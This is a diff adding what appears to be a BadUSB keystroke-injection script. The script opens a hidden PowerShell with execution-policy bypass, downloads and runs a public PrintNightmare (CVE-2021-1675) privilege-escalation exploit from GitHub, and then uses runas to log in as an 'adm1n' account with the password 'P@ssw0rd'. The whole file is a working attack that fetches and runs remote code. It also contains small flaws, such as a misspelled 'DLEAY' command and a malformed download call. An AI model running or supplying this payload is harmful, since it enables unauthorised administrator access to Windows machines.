@@ -1,0 +1,17 @@
+GUI r
+DELAY 150
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1',\"$env:temp\cve20211675.ps1\"); Import-Module \"$env:temp\cve20211675.ps1\"; Invoke-Nightmare"
+ENTER
+DLEAY 1000
+GUI r
+DELAY 150
+STRING cmd
+DELAY 150
+ENTER
+DELAY 150
+STRING runas /user:adm1n cmd.exe
+ENTER
+DELAY 150
+STRING P@ssw0rd
+DELAY 150
+ENTER
